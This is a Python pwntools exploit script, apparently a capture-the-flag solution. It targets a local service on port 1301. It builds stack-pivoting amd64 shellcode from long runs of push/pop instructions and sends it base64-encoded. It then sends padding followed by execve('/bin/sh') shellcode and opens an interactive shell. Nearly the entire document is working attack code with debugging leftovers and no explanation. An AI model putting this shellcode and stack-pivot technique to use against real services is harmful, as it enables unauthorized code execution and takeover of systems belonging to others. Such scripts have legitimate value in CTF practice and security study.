from pwn import *
from base64 import b64encode
#p=process("python3 main.py".split(" "))
p=remote("localhost",1301)
context.arch="amd64"

#p.send(p16(0))
add=b"\x05"+b"\x0f"*4

shellcode=""

#gdb.attach(p,"c")

shellcode+='''
        push rax
        pop rdi
        push r11
        pop rsi
        push rbx
        pop rdx
        '''
shellcode+="int3\n"  # remote 

#shellcode+="pop rbx\n"*(0x448//8) # local
shellcode+="pop rbx\n"*(0x210//8)
shellcode+="pop rdx\n"  ## this goes in rdx for read later
shellcode+="pop rbx\n"   ## 0x220 in total
shellcode+="pop rbx\n"   ## 0x220 in total
shellcode+="pop rcx\n"  # this will go to rsp 

shellcode+="pop rbx\n"*(0xd0//8)
shellcode+="pop rdx\n"  ## this goes in rdx for read later
shellcode+="push rcx\n"  
shellcode+="pop rsp\n"  

shellcode+="pop rbx\n"*(0xd030//8)
shellcode+="pop rcx\n"
shellcode+=f'''
        push r11
        pop rsp
        pop rbx
'''

shellcode+="pop rbx\n"*(0x1a6e//8)+"pop rbx\n"*(0x1a6e//64)
shellcode+="pop rbx\n"*(17)
#shellcode+="pop r10\n"*1



#shellcode+="int3\n"  # remote 
#shellcode+="int3\n"  # remote 
shellcode+="push rcx\n"
shellcode+="pop rbx\n"*(2)
print(len(asm(shellcode)))

#gdb.attach(p,"c")
pause()
p.sendline(b64encode(asm(shellcode)))

shell='''
    lea rdi,[rip+shell]
    mov rsi,0
    mov rdx,0
    mov rax,0x3b
    syscall
    shell:
    .string "/bin/sh"

'''
p.sendline(b"a"*0x1e3f+asm(shell))
p.interactive()